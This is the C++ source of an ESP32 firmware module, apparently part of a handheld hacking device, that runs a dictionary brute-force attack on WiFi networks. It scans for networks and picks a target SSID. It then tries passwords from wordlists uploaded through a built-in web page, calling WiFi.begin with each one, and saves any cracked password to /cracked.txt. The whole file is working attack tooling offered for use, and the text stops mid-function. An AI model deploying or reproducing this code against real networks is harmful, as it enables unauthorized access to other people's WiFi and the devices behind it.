#include "wifi_brute.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "config.h"
#include "pins.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

WebServer bruteServer(80);

const char* BRUTE_AP_SSID = "ESP32-Brute";
const char* BRUTE_AP_PASS = "brute1234";
const int ATTEMPT_DELAY = 100;
const int CONNECT_TIMEOUT = 20;
const int MAX_WORDLISTS = 10;
const char* WORDLIST_DIR = "/wordlists";

bool bruteRunning = false;
String targetSSID = "";
int currentAttempt = 0;
int totalPasswords = 0;
String statusText = "Idle";
String currentPassword = "";
unsigned long lastAttempt = 0;
unsigned long startTime = 0;
float attemptsPerSecond = 0;
File passwordFile;
String currentWordlist = "";
int wordlistCount = 0;
String wordlistNames[MAX_WORDLISTS];
int wordlistSizes[MAX_WORDLISTS];
int wordlistPasswords[MAX_WORDLISTS];
bool bruteExiting = false;

struct BruteNetwork {
    String ssid;
    int rssi;
    int channel;
};
BruteNetwork bruteNetworks[50];
int bruteNetworkCount = 0;

int bruteMenuIndex = 0;
int bruteMenuLevel = 0;
String bruteMenuTitle = "WiFi Brute";
int wordlistMenuIndex = 0;
bool inWordlistMenu = false;
bool inNetworkMenu = false;
unsigned long lastMonitorUpdate = 0;
int bruteScrollOffset = 0;
const int VISIBLE_ITEMS = 4;

const char* bruteMainItems[] = {
    "Scan Networks",
    "Select Network",
    "Start Attack",
    "Stop Attack",
    "Status",
    "Web Upload",
    "Wordlist Manager",
    "Speed Info",
    "Back"
};
const int bruteMainCount = 9;

// =================================================
// FORWARD DECLARATIONS
// =================================================
void loadWordlist(String filename);
void showBruteMainMenu();
void handleBruteUpload();
void scanBruteNetworks();
void startBruteAttack();
void stopBruteAttack();
void showNetworkList();
void showWordlistManager();
void showStatusScreen();
void showSpeedInfo();
void showWebUploadScreen();
void showBruteAttackScreen();
void drawBruteHeader(const char* title, bool active);
void drawScrollingMenuBox(const char** items, int count, int selected, int maxVisible, const char* title, bool active);
void createWordlistDirectory();
void scanWordlists();
void selectWordlist(int index);
void setupBruteWebRoutes();
void handleBruteButtons();

// =================================================
// DRAW FUNCTIONS
// =================================================

void drawRoundedBox(int x, int y, int w, int h, int r) {
    if (w < 2 * r) r = w / 2;
    if (h < 2 * r) r = h / 2;
    
    u8g2.drawHLine(x + r, y, w - 2 * r);
    u8g2.drawHLine(x + r, y + h - 1, w - 2 * r);
    u8g2.drawVLine(x, y + r, h - 2 * r);
    u8g2.drawVLine(x + w - 1, y + r, h - 2 * r);
    
    u8g2.drawCircle(x + r, y + r, r, U8G2_DRAW_UPPER_LEFT);
    u8g2.drawCircle(x + w - r - 1, y + r, r, U8G2_DRAW_UPPER_RIGHT);
    u8g2.drawCircle(x + r, y + h - r - 1, r, U8G2_DRAW_LOWER_LEFT);
    u8g2.drawCircle(x + w - r - 1, y + h - r - 1, r, U8G2_DRAW_LOWER_RIGHT);
}

void drawFilledRoundedBox(int x, int y, int w, int h, int r) {
    if (w < 2 * r) r = w / 2;
    if (h < 2 * r) r = h / 2;
    
    u8g2.drawBox(x + r, y, w - 2 * r, h);
    u8g2.drawBox(x, y + r, w, h - 2 * r);
    
    u8g2.drawDisc(x + r, y + r, r, U8G2_DRAW_ALL);
    u8g2.drawDisc(x + w - r - 1, y + r, r, U8G2_DRAW_ALL);
    u8g2.drawDisc(x + r, y + h - r - 1, r, U8G2_DRAW_ALL);
    u8g2.drawDisc(x + w - r - 1, y + h - r - 1, r, U8G2_DRAW_ALL);
}

void drawBruteHeader(const char* title, bool active) {
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(16, 10);
    u8g2.print(title);
    
    u8g2.setCursor(115, 10);
    u8g2.print(active ? "●" : "○");
    
    u8g2.drawLine(0, 13, 128, 13);
}

void drawScrollingMenuBox(const char** items, int count, int selected, int maxVisible, const char* title, bool active) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    drawBruteHeader(title, active);
    
    char statusBuf[30];
    if (targetSSID != "") {
        snprintf(statusBuf, sizeof(statusBuf), "T: %.12s", targetSSID.c_str());
    } else {
        snprintf(statusBuf, sizeof(statusBuf), "No target");
    }
    u8g2.setCursor(2, 22);
    u8g2.print(statusBuf);
    
    if (currentWordlist != "") {
        u8g2.setCursor(70, 22);
        u8g2.print("WL: ");
        if (currentWordlist.length() > 8) {
            u8g2.print(currentWordlist.substring(0, 7).c_str());
        } else {
            u8g2.print(currentWordlist.c_str());
        }
    }
    
    int boxX = 4;
    int boxY = 26;
    int boxW = 120;
    int boxH = 36;
    int cornerRadius = 8;
    
    drawRoundedBox(boxX, boxY, boxW, boxH, cornerRadius);
    
    if (selected < 0) selected = 0;
    if (selected >= count) selected = count - 1;
    
    int scrollOffset = 0;
    if (count > maxVisible) {
        scrollOffset = selected - 1;
        if (scrollOffset < 0) scrollOffset = 0;
        if (scrollOffset + maxVisible > count) {
            scrollOffset = count - maxVisible;
        }
    }
    
    int startItem = scrollOffset;
    int endItem = startItem + maxVisible;
    if (endItem > count) endItem = count;
    
    int itemHeight = 8;
    int totalItems = endItem - startItem;
    int totalHeight = totalItems * itemHeight;
    int startY = boxY + (boxH - totalHeight) / 2 + 7;
    
    for (int i = startItem; i < endItem; i++) {
        int posInList = i - startItem;
        int yPos = startY + posInList * itemHeight;
        int textWidth = u8g2.getStrWidth(items[i]);
        int textX = boxX + (boxW - textWidth) / 2;
        
        if (i == selected) {
            int itemBoxX = boxX + 4;
            int itemBoxW = boxW - 8;
            int itemBoxY = yPos - 7;
            int itemBoxH = 8;
            
            drawFilledRoundedBox(itemBoxX, itemBoxY, itemBoxW, itemBoxH, 4);
            
            u8g2.setDrawColor(0);
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.setCursor(textX, yPos);
            u8g2.print(items[i]);
            u8g2.setDrawColor(1);
        } else {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.setCursor(textX, yPos);
            u8g2.print(items[i]);
        }
    }
    
    if (scrollOffset > 0) {
        u8g2.setCursor(boxX + 54, boxY + 4);
        u8g2.print("▲");
    }
    if (scrollOffset + maxVisible < count) {
        u8g2.setCursor(boxX + 54, boxY + boxH - 4);
        u8g2.print("▼");
    }
    
    u8g2.sendBuffer();
}

// =================================================
// WORDLIST FUNCTIONS
// =================================================

void createWordlistDirectory() {
    if (!SPIFFS.exists(WORDLIST_DIR)) {
        Serial.println("📁 Creating wordlist directory: " + String(WORDLIST_DIR));
        if (SPIFFS.mkdir(WORDLIST_DIR)) {
            Serial.println("✅ Wordlist directory created");
        } else {
            Serial.println("❌ Failed to create wordlist directory");
        }
    }
}

void scanWordlists() {
    wordlistCount = 0;
    
    if (!SPIFFS.begin(true)) {
        Serial.println("❌ Cannot scan - SPIFFS not mounted");
        return;
    }
    
    createWordlistDirectory();
    
    File dir = SPIFFS.open(WORDLIST_DIR);
    if (!dir) {
        Serial.println("❌ Failed to open wordlist directory");
        return;
    }
    
    if (!dir.isDirectory()) {
        dir.close();
        return;
    }
    
    File file = dir.openNextFile();
    while (file && wordlistCount < MAX_WORDLISTS) {
        String fileName = file.name();
        if (fileName.startsWith("/")) fileName = fileName.substring(1);
        
        if (!file.isDirectory() && fileName.endsWith(".txt")) {
            wordlistNames[wordlistCount] = fileName;
            wordlistSizes[wordlistCount] = file.size();
            
            String fullPath = String(WORDLIST_DIR) + "/" + fileName;
            File f = SPIFFS.open(fullPath, "r");
            int count = 0;
            if (f) {
                while (f.available()) {
                    String line = f.readStringUntil('\n');
                    if (line.endsWith("\r")) line = line.substring(0, line.length() - 1);
                    line.trim();
                    if (line.length() > 0) count++;
                }
                f.close();
            }
            wordlistPasswords[wordlistCount] = count;
            wordlistCount++;
        }
        file = dir.openNextFile();
    }
    dir.close();
}

void loadWordlist(String filename) {
    if (passwordFile) passwordFile.close();
    
    String fullPath = String(WORDLIST_DIR) + "/" + filename;
    passwordFile = SPIFFS.open(fullPath, "r");
    if (!passwordFile) {
        statusText = "Cannot open!";
        return;
    }
    
    currentWordlist = filename;
    totalPasswords = 0;
    
    while (passwordFile.available()) {
        String line = passwordFile.readStringUntil('\n');
        if (line.endsWith("\r")) line = line.substring(0, line.length() - 1);
        line.trim();
        if (line.length() > 0) totalPasswords++;
    }
    passwordFile.seek(0);
    statusText = "Loaded: " + filename + " (" + String(totalPasswords) + " pwds)";
}

void selectWordlist(int index) {
    if (index < 0 || index >= wordlistCount) return;
    currentWordlist = wordlistNames[index];
    statusText = "Selected: " + currentWordlist;
    loadWordlist(currentWordlist);
}

// =================================================
// SCAN FUNCTIONS
// =================================================

void scanBruteNetworks() {
    showPopupMessage("📡 Scanning...", "Looking for networks");
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    drawBruteHeader("Scanning", false);
    CenteredStr(35, "Scanning Networks...");
    u8g2.sendBuffer();
    
    bruteNetworkCount = 0;
    int n = WiFi.scanNetworks();
    
    if (n > 0) {
        for (int i = 0; i < n && i < 50; i++) {
            String ssid = WiFi.SSID(i);
            if (ssid.length() > 0 && ssid.length() < 50) {
                bruteNetworks[bruteNetworkCount].ssid = ssid;
                bruteNetworks[bruteNetworkCount].rssi = WiFi.RSSI(i);
                bruteNetworks[bruteNetworkCount].channel = WiFi.channel(i);
                bruteNetworkCount++;
            }
        }
        statusText = "Found " + String(bruteNetworkCount) + " nets";
        
        char resultStr[30];
        sprintf(resultStr, "Found %d networks", bruteNetworkCount);
        showPopupMessage("✅ Scan Complete", resultStr);
        delay(800);
        
    } else {
        statusText = "No networks found";
        showPopupMessage("❌ No Networks", "Nothing found");
        delay(800);
    }
    
    WiFi.scanDelete();
    showBruteMainMenu();
}

// =================================================
// ATTACK FUNCTIONS
// =================================================

void startBruteAttack() {
    if (targetSSID == "") {
        showPopupMessage("❌ No Target!", "Select a network first");
        delay(1000);
        showBruteMainMenu();
        return;
    }
    
    if (currentWordlist == "") {
        showPopupMessage("❌ No Wordlist!", "Select a wordlist");
        delay(1000);
        showBruteMainMenu();
        return;
    }
    
    String fullPath = String(WORDLIST_DIR) + "/" + currentWordlist;
    if (!SPIFFS.exists(fullPath)) {
        showPopupMessage("❌ Wordlist missing!", currentWordlist.c_str());
        delay(1000);
        showBruteMainMenu();
        return;
    }
    
    File file = SPIFFS.open(fullPath, "r");
    if (!file) {
        showPopupMessage("❌ Cannot read!", "");
        delay(1000);
        return;
    }
    
    totalPasswords = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.endsWith("\r")) line = line.substring(0, line.length() - 1);
        line.trim();
        if (line.length() > 0) totalPasswords++;
    }
    file.close();
    
    if (totalPasswords == 0) {
        showPopupMessage("❌ Wordlist empty!", "");
        delay(1000);
        showBruteMainMenu();
        return;
    }
    
    passwordFile = SPIFFS.open(fullPath, "r");
    if (!passwordFile) {
        showPopupMessage("❌ Cannot open!", "");
        delay(1000);
        return;
    }
    
    currentAttempt = 0;
    bruteRunning = true;
    statusText = "Attacking...";
    currentPassword = "";
    lastAttempt = 0;
    startTime = millis();
    attemptsPerSecond = 0;
    bruteMenuLevel = 4;
    bruteMenuTitle = "ATTACKING";
    
    Serial.println("========================================");
    Serial.println("🔥 ATTACK STARTED!");
    Serial.println("Target: " + targetSSID);
    Serial.println("Wordlist: " + currentWordlist);
    Serial.println("Total passwords: " + String(totalPasswords));
    Serial.println("========================================");
    
    showPopupMessage("🔴 ATTACK STARTED!", targetSSID.c_str(), String(totalPasswords).c_str());
    delay(1000);
}

void stopBruteAttack() {
    if (bruteRunning) {
        bruteRunning = false;
        if (passwordFile) passwordFile.close();
        WiFi.disconnect(true);
        statusText = "Stopped";
        showPopupMessage("⏹️ Attack Stopped", "", "");
        delay(800);
        showBruteMainMenu();
    }
}

void bruteForceLoop() {
    if (!bruteRunning) return;
    if (millis() - lastAttempt < ATTEMPT_DELAY) return;
    lastAttempt = millis();
    
    if (!passwordFile || !passwordFile.available()) {
        if (passwordFile) passwordFile.close();
        bruteRunning = false;
        statusText = "Password not found";
        showPopupMessage("❌ Password Not Found", "Try different wordlist", "");
        delay(1000);
        showBruteMainMenu();
        return;
    }
    
    currentPassword = passwordFile.readStringUntil('\n');
    if (currentPassword.endsWith("\r")) currentPassword = currentPassword.substring(0, currentPassword.length() - 1);
    currentPassword.trim();
    if (currentPassword.length() == 0) return;
    
    currentAttempt++;
    statusText = "Testing: " + currentPassword;
    
    unsigned long elapsed = millis() - startTime;
    if (elapsed > 0) attemptsPerSecond = (float)currentAttempt * 1000.0 / elapsed;
    
    WiFi.begin(targetSSID.c_str(), currentPassword.c_str());
    
    int timeout = CONNECT_TIMEOUT;
    bool connected = false;
    for (int i = 0; i < timeout; i++) {
        delay(100);
        if (WiFi.status() == WL_CONNECTED) { connected = true; break; }
        bruteServer.handleClient();
    }
    
    if (connected) {
        if (passwordFile) passwordFile.close();
        bruteRunning = false;
        statusText = "SUCCESS! Password: " + currentPassword;
        
        Serial.println("========================================");
        Serial.println("✅ PASSWORD FOUND!");
        Serial.println("SSID: " + targetSSID);
        Serial.println("Password: " + currentPassword);
        Serial.println("Attempts: " + String(currentAttempt) + "/" + String(totalPasswords));
        Serial.println("========================================");
        
        File result = SPIFFS.open("/cracked.txt", "w");
        if (result) {
            result.println("=== CRACKED NETWORK ===");
            result.print("SSID: "); result.println(targetSSID);
            result.print("Password: "); result.println(currentPassword);
            result.print("Attempts: "); result.println(currentAttempt);
            result.close();
        }
        
        WiFi.disconnect(true);
        
        showCredentialPopup(targetSSID.c_str(), currentPassword.c_str(), "WiFi", "Brute Force");
        delay(3000);
        
        bruteMenuLevel = 0;
        showBruteMainMenu();
    } else {
        WiFi.disconnect(true);
        delay(10);
    }
}

// =================================================
// WEB SERVER FUNCTIONS
// =================================================

void handleBruteUpload() {
    HTTPUpload& upload = bruteServer.upload();
    static String filename;
    static File uploadFile;
    static bool uploadStarted = false;
    
    if (!SPIFFS.begin(true)) return;
    
    if (upload.status == UPLOAD_FILE_START) createWordlistDirectory();
    
    switch (upload.status) {
        case UPLOAD_FILE_START:
            filename = String(WORDLIST_DIR) + "/wordlist_" + String(millis()) + ".txt";
            if (SPIFFS.exists(filename)) SPIFFS.remove(filename);
            uploadFile = SPIFFS.open(filename, FILE_WRITE);
            uploadStarted = uploadFile;
            break;
        case UPLOAD_FILE_WRITE:
            if (uploadStarted && uploadFile) uploadFile.write(upload.buf, upload.currentSize);
            break;
        case UPLOAD_FILE_END:
            if (uploadStarted && uploadFile) {
                uploadFile.close();
                scanWordlists();
                statusText = "Uploaded: " + filename.substring(String(WORDLIST_DIR).length() + 1);
                showPopupMessage("📤 Uploaded!", "Wordlist saved", "");
                delay(800);
            }
            uploadStarted = false;
            break;
        case UPLOAD_FILE_ABORTED:
            if (uploadStarted && uploadFile) uploadFile.close();
            uploadStarted = false;
            break;
    }
}

void setupBruteWebRoutes() {
    bruteServer.on("/", HTTP_GET, []() {
        String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ESP32 - Upload Wordlist</title>
  <style>
    body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
    .container{max-width:500px;width:100%;background:#111;border:2px solid #00ff41;border-radius:10px;padding:30px;text-align:center}
    h1{font-size:24px;margin-bottom:10px;color:#00ff41}
    .subtitle{font-size:14px;color:#00aa33;margin-bottom:30px}
    .folder-info{background:#001a0a;padding:10px;border-radius:5px;margin-bottom:20px;font-size:12px;color:#00aa33}
    input[type="file"]{width:100%;padding:15px;margin:10px 0;background:#000;border:1px solid #00ff41;color:#00ff41;font-family:'Courier New',monospace;cursor:pointer}
    button{width:100%;padding:15px;margin:10px 0;background:#000;border:1px solid #00ff41;color:#00ff41;font-family:'Courier New',monospace;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s}
    button:hover{background:#00ff41;color:#000}
    #status{margin-top:20px;padding:10px;border-left:3px solid #00ff41;min-height:20px;word-break:break-all}
    .info{margin-top:20px;font-size:12px;color:#006622;border-top:1px solid #003311;padding-top:15px}
    .success{color:#00ff41}
    .error{color:#ff4444}
    .file-info{color:#00aa33;font-size:12px;margin-top:5px}
  </style>
</head>
<body>
  <div class="container">
    <h1>📤 UPLOAD WORDLIST</h1>
    <div class="subtitle">WiFi Brute Force</div>
    <div class="folder-info">📁 Uploads go to: /wordlists/ folder</div>
    <form id="uploadForm" enctype="multipart/form-data">
      <input type="file" name="file" accept=".txt" required>
      <div class="file-info" id="fileName">No file selected</div>
      <button type="submit">📤 UPLOAD</button>
    </form>
    <div id="status">Ready for upload...</div>
    <div class="info">
      <div>📁 Supported: .txt files (one password per line)</div>
      <div>🔗 AP: ESP32-Brute | Pass: brute1234</div>
    </div>
  </div>
  <script>
    const fileInput = document.querySelector('input[type="file"]');
    fileInput.addEventListener('change', function() {
      if (this.files && this.files.length > 0) {
        document.getElementById('fileName').textContent = '📄 ' + this.files[0].name + ' (' + (this.files[0].size/1024).toFixed(1) + ' KB)';
      }
    });
    document.getElementById('uploadForm').onsubmit = async (e) => {
      e.preventDefault();
      const formData = new FormData(e.target);
      const statusDiv = document.getElementById('status');
      if (!fileInput.files || fileInput.files.length === 0) {
        statusDiv.innerHTML = '<span class="error">❌ Please select a file</span>';
        return;
      }
      statusDiv.innerHTML = '⏳ Uploading...';
      try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const text = await res.text();
        if (res.ok) {
          statusDiv.innerHTML = '<span class="success">✅ ' + text + '</span>';
        } else {
          statusDiv.innerHTML = '<span class="error">❌ Upload failed: ' + text + '</span>';
        }
      } catch (err) {
        statusDiv.innerHTML = '<span class="error">❌ Error: ' + err.message + '</span>';
      }
      setTimeout(() => { fileInput.value = ''; document.getElementById('fileName').textContent = 'No file selected'; }, 3000);
    };
  </script>
</body>
</html>
)rawliteral";
        bruteServer.send(200, "text/html", html);
    });

    bruteServer.on("/upload", HTTP_POST, []() {
        bruteServer.send(200, "text/plain", "Wordlist uploaded successfully!");
    }, handleBruteUpload);
}

// =================================================
// MENU DISPLAY FUNCTIONS
// =================================================

void showBruteMainMenu() {
    bruteMenuLevel = 0;
    bruteMenuTitle = "WiFi Brute";
    bruteMenuIndex = 0;
    inWordlistMenu = false;
    inNetworkMenu = false;
    
    drawScrollingMenuBox(bruteMainItems, bruteMainCount, bruteMenuIndex, VISIBLE_ITEMS, bruteMenuTitle.c_str(), bruteRunning);
}

void showNetworkList() {
    inNetworkMenu = true;
    bruteMenuLevel = 1;
    bruteMenuTitle = "Select Network";
    bruteMenuIndex = 0;
    
    if (bruteNetworkCount == 0) {
        const char* emptyItems[] = {"No networks found", "Press BACK"};
        drawScrollingMenuBox(emptyItems, 2, 0, VISIBLE_ITEMS, "Select Network", false);
        return;
    }
    
    static String displayNames[50];
    const char* items[50];
    
    for (int i = 0; i < bruteNetworkCount && i < 50; i++) {
        String ssid = bruteNetworks[i].ssid;
        if (ssid.length() > 12) ssid = ssid.substring(0, 10) + "..";
        String signal;
        int rssi = bruteNetworks[i].rssi;
        if (rssi > -50) signal = "★★★★★";
        else if (rssi > -60) signal = "★★★★";
        else if (rssi > -70) signal = "★★★";
        else if (rssi > -80) signal = "★★";
        else signal = "★";
        displayNames[i] = ssid + " " + signal;
        items[i] = displayNames[i].c_str();
    }
    
    drawScrollingMenuBox(items, bruteNetworkCount, bruteMenuIndex, VISIBLE_ITEMS, "Select Network", false);
}

void showWordlistManager() {
    inWordlistMenu = true;
    bruteMenuLevel = 2;
    bruteMenuTitle = "Wordlists";
    wordlistMenuIndex = 0;
    
    scanWordlists();
    
    if (wordlistCount == 0) {
        const char* emptyItems[] = {"No wordlists found", "Upload via Web"};
        drawScrollingMenuBox(emptyItems, 2, 0, VISIBLE_ITEMS, "Wordlists", false);
        return;
    }
    
    static String displayNames[MAX_WORDLISTS];
    const char* items[MAX_WORDLISTS];
    
    for (int i = 0; i < wordlistCount && i < MAX_WORDLISTS; i++) {
        String name = wordlistNames[i];
        if (name.length() > 10) name = name.substring(0, 8) + "..";
        String prefix = (currentWordlist == wordlistNames[i]) ? "✓ " : "  ";
        displayNames[i] = prefix + name + " (" + String(wordlistPasswords[i]) + "pw)";
        items[i] = displayNames[i].c_str();
    }
    
    drawScrollingMenuBox(items, wordlistCount, wordlistMenuIndex, VISIBLE_ITEMS, "Wordlists", false);
}

void showStatusScreen() {
    bruteMenuLevel = 3;
    bruteMenuTitle = "Status";
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    drawBruteHeader("Status", bruteRunning);
    
    int y = 22;
    u8g2.setCursor(2, y);
    u8g2.print("Target: ");
    if (targetSSID == "") u8g2.print("None");
    else u8g2.print(targetSSID.c_str());
    y += 10;
    
    u8g2.setCursor(2, y);
    u8g2.print("Status: ");
    if (statusText.length() > 16) {
        u8g2.print(statusText.substring(0, 14).c_str());
        y += 10;
        u8g2.setCursor(2, y);
        u8g2.print(statusText.substring(14).c_str());
    } else {
        u8g2.print(statusText.c_str());
    }
    y += 10;
    
    u8g2.setCursor(2, y);
    u8g2.print("Wordlist: ");
    if (currentWordlist == "") u8g2.print("None");
    else {
        String name = currentWordlist;
        if (name.length() > 12) name = name.substring(0, 10) + "..";
        u8g2.print(name.c_str());
    }
    y += 10;
    
    if (bruteRunning) {
        u8g2.setCursor(2, y);
        u8g2.print("Attempt: " + String(currentAttempt) + "/" + String(totalPasswords));
        y += 10;
        u8g2.setCursor(2, y);
        u8g2.print("Speed: " + String((int)attemptsPerSecond) + "/sec");
        y += 10;
        if (totalPasswords > 0) {
            int percent = (currentAttempt * 100) / totalPasswords;
            u8g2.setCursor(2, y);
            u8g2.print("Progress: " + String(percent) + "%");
            u8g2.drawBox(70, y-6, map(percent, 0, 100, 0, 50), 5);
        }
    }
    
    u8g2.sendBuffer();
}

void showBruteAttackScreen() {
    bruteMenuLevel = 4;
    bruteMenuTitle = "ATTACKING";
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    drawBruteHeader("ATTACKING", true);
    
    int y = 22;
    u8g2.setCursor(2, y);
    u8g2.print("Target: ");
    if (targetSSID.length() > 12) {
        u8g2.print(targetSSID.substring(0, 12).c_str());
        y += 10;
        u8g2.setCursor(2, y);
        u8g2.print(targetSSID.substring(12).c_str());
    } else {
        u8g2.print(targetSSID.c_str());
    }
    y += 10;
    
    u8g2.setCursor(2, y);
    u8g2.print("Try: " + String(currentAttempt) + "/" + String(totalPasswords));
    y += 10;
    
    u8g2.setCursor(2, y);
    u8g2.print("Speed: " + String((int)attemptsPerSecond) + "/sec");
    y += 10;
    
    u8g2.setCursor(2, y);
    u8g2.print("Pwd: ");
    if (currentPassword.length() > 14) {
        u8g2.print(currentPassword.substring(0, 12).c_str());
        y += 10;
        u8g2.setCursor(2, y);
        u8g2.print(currentPassword.substring(12).c_str());
    } else {
        u8g2.print(currentPassword.c_str());
    }
    y += 10;
    
    if (totalPasswords > 0) {
        int percent = (currentAttempt * 100) / totalPasswords;
        u8g2.drawFrame(2, y, 124, 6);
        u8g2.drawBox(4, y+1, map(percent, 0, 100, 0, 120), 4);
    }
    
    u8g2.sendBuffer();
}

void showSpeedInfo() {
    bruteMenuLevel = 5;
    bruteMenuTitle = "Speed Info";
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    drawBruteHeader("Speed Info", false);
    
    u8g2.setCursor(2, 24);
    u8g2.print("⚡ Delay: 100ms");
    u8g2.setCursor(2, 34);
    u8g2.print("⚡ Timeout: 20");
    u8g2.setCursor(2, 44);
    u8g2.print("⚡ Power: Max TX");
    u8g2.setCursor(2, 54);
    u8g2.print("⚡ Speed: ~10/sec");
    
    u8g2.sendBuffer();
}

void showWebUploadScreen() {
    bruteMenuLevel = 6;
    bruteMenuTitle = "Web Upload";
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    drawBruteHeader("Web Upload", false);
    
    u8g2.setCursor(2, 24);
    u8g2.print("1. Connect to AP:");
    u8g2.setCursor(2, 34);
    u8g2.print(BRUTE_AP_SSID);
    u8g2.setCursor(2, 44);
    u8g2.print("2. Open browser:");
    u8g2.setCursor(2, 54);
    u8g2.print(WiFi.softAPIP().toString().c_str());
    u8g2.setCursor(2, 62);
    u8g2.print("3. Upload .txt file");
    
    u8g2.sendBuffer();
}

// =================================================
// BUTTON HANDLING
// =================================================

void handleBruteButtons() {
    static unsigned long lastButtonTime = 0;
    unsigned long now = millis();
    if (now - lastButtonTime < 200) return;
    
    if (isButtonPressed(BTN_BACK)) {
        lastButtonTime = now;
        if (bruteMenuLevel == 4 && bruteRunning) {
            stopBruteAttack();
        } else if (bruteMenuLevel == 5 || bruteMenuLevel == 6) {
            bruteMenuLevel = 0;
            showBruteMainMenu();
        } else if (bruteMenuLevel == 1 || bruteMenuLevel == 2 || bruteMenuLevel == 3) {
            bruteMenuLevel = 0;
            showBruteMainMenu();
        } else if (bruteMenuLevel == 0) {
            bruteExiting = true;
        }
        return;
    }
    
    if (isButtonPressed(BTN_UP)) {
        lastButtonTime = now;
        if (bruteMenuLevel == 0) {
            bruteMenuIndex = (bruteMenuIndex - 1 + bruteMainCount) % bruteMainCount;
            drawScrollingMenuBox(bruteMainItems, bruteMainCount, bruteMenuIndex, VISIBLE_ITEMS, bruteMenuTitle.c_str(), bruteRunning);
        } else if (bruteMenuLevel == 1 && bruteNetworkCount > 0) {
            bruteMenuIndex = (bruteMenuIndex - 1 + bruteNetworkCount) % bruteNetworkCount;
            showNetworkList();
        } else if (bruteMenuLevel == 2 && wordlistCount > 0) {
            wordlistMenuIndex = (wordlistMenuIndex - 1 + wordlistCount) % wordlistCount;
            showWordlistManager();
        }
        return;
    }
    
    if (isButtonPressed(BTN_DOWN)) {
        lastButtonTime = now;
        if (bruteMenuLevel == 0) {
            bruteMenuIndex = (bruteMenuIndex + 1) % bruteMainCount;
            drawScrollingMenuBox(bruteMainItems, bruteMainCount, bruteMenuIndex, VISIBLE_ITEMS, bruteMenuTitle.c_str(), bruteRunning);
        } else if (bruteMenuLevel == 1 && bruteNetworkCount > 0) {
            bruteMenuIndex = (bruteMenuIndex + 1) % bruteNetworkCount;
            showNetworkList();
        } else if (bruteMenuLevel == 2 && wordlistCount > 0) {
            wordlistMenuIndex = (wordlistMenuIndex + 1) % wordlistCount;
            showWordlistManager();
        }
        return;
    }
    
    if (isButtonPressed(BTN_SELECT)) {
        lastButtonTime = now;
        
        if (bruteMenuLevel == 0) {
            switch(bruteMenuIndex) {
                case 0: scanBruteNetworks(); break;
                case 1: showNetworkList(); break;
                case 2: startBruteAttack(); break;
                case 3: stopBruteAttack(); break;
                case 4: showStatusScreen(); break;
                case 5: showWebUploadScreen(); break;
                case 6: showWordlistManager(); break;
                case 7: showSpeedInfo(); break;
                case 8: bruteExiting = true; break;
            }
            return;
        }
        
        if (bruteMenuLevel == 1 && bruteNetworkCount > 0) {
            if (bruteMenuIndex < bruteNetworkCount) {
                targetSSID = bruteNetworks[bruteMenuIndex].ssid;
                statusText = "Target: " + targetSSID;
                bruteMenuLevel = 0;
                bruteMenuIndex = 2;
                showBruteMainMenu();
                showPopupMessage("🎯 Target Selected", targetSSID.c_str(), "");
                delay(800);
            }
            return;
        }
        
        if (bruteMenuLevel == 2 && wordlistCount > 0) {
            if (wordlistMenuIndex < wordlistCount) {
                selectWordlist(wordlistMenuIndex);
                bruteMenuLevel = 0;
                bruteMenuIndex = 2;
                showBruteMainMenu();
                showPopupMessage("📄 Wordlist Selected", currentWordlist.c_str(), "");
                delay(800);
            }
            return;
        }
        
        if (bruteMenuLevel == 3 || bruteMenuLevel == 5 || bruteMenuLevel == 6) {
            bruteMenuLevel = 0;
            showBruteMainMenu();
            return;
        }
    }
}

// =================================================
// SETUP
// =================================================

void wifiBruteSetup() {
    bruteRunning = false;
    bruteNetworkCount = 0;
    targetSSID = "";
    statusText = "Idle";
    currentWordlist = "";
    bruteExiting = false;
    bruteMenuIndex = 0;
    bruteMenuLevel = 0;
    wordlistMenuIndex = 0;
    inWordlistMenu = false;
    inNetworkMenu = false;
    clearPopup();
    
    Serial.println("📁 Initializing SPIFFS...");
    if (!SPIFFS.begin(true)) {
        Serial.println("❌ SPIFFS Mount Failed - Formatting...");
        if (SPIFFS.format()) {
            Serial.println("✅ SPIFFS Formatted");
            SPIFFS.begin(true);
        }
    }
    
    createWordlistDirectory();
    
    WiFi.disconnect(true);
    delay(100);
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    
    WiFi.softAP(BRUTE_AP_SSID, BRUTE_AP_PASS);
    esp_wifi_set_ps(WIFI_PS_NONE);
    
    setupBruteWebRoutes();
    bruteServer.begin();
    scanWordlists();
    
    if (wordlistCount > 0) {
        selectWordlist(0);
    }
    
    showBruteMainMenu();
    
    Serial.println("🔓 WiFi Brute Force initialized");
    Serial.printf("📡 AP: %s | Pass: %s\n", BRUTE_AP_SSID, BRUTE_AP_PASS);
    Serial.printf("🌐 IP: %s\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("📊 Wordlists found: %d\n", wordlistCount);
}

// =================================================
// LOOP
// =================================================

void wifiBruteLoop() {
    if (drawPopupIfActive()) {
        delay(50);
        return;
    }
    
    if (bruteExiting) {
        wifiBruteCleanup();
        return;
    }
    
    bruteServer.handleClient();
    
    if (bruteRunning) {
        bruteForceLoop();
        if (bruteMenuLevel == 4) {
